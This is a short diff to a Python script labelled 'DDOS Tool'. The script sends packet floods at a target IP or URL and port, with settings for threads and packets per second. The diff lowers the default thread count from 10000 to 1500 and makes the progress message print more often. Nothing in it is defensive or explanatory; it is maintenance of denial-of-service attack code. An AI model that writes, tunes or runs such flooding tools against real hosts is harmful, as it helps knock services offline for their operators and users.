@@ -23,7 +23,7 @@ def send_packets(target_ip, target_port, packets_per_second):
                 sent_packets += 1
 
                 # Print message every 10,000 packets
-                if sent_packets % 10000 == 0:
+                if sent_packets % 1500 == 0:
                     print(f"sent {sent_packets} packets")
 
         except Exception as e:
@@ -38,7 +38,7 @@ def parse_arguments():
     parser = argparse.ArgumentParser(description='DDOS Tool')
     parser.add_argument('target', help='Target URL or IP address')
     parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
-    parser.add_argument('--threads', type=int, default=10000, help='Number of threads (default: 10000)')
+    parser.add_argument('--threads', type=int, default=1500, help='Number of threads (default: 1500)')
     parser.add_argument('--packets', type=int, default=1000000, help='Packets per second (default: 1000000)')
     return parser.parse_args()
 
